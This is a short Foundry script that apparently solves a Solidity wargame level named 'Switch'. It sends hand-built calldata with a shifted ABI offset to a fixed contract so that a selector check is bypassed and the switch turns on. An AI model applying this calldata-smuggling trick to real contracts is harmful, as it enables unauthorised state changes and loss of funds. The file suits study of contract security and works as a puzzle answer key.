// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Switch.sol";

contract SwitchScript is Script {
    Switch public target;
    function setUp() public {
        target = Switch(0x9cF05a59690b860166AF976A09A16aDC8Db27010);
    }

    function run() public {
        vm.startBroadcast();

        // offset points data chunk; chunk inlucde data length
        bytes memory bytes_ = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000044000000000000000000000000000000000000000000000000000000000000000020606e15000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        console.log("switch: ", target.switchOn());
        address(target).call(bytes_);
        console.log("switch: ", target.switchOn());

        vm.stopBroadcast();
    }

}
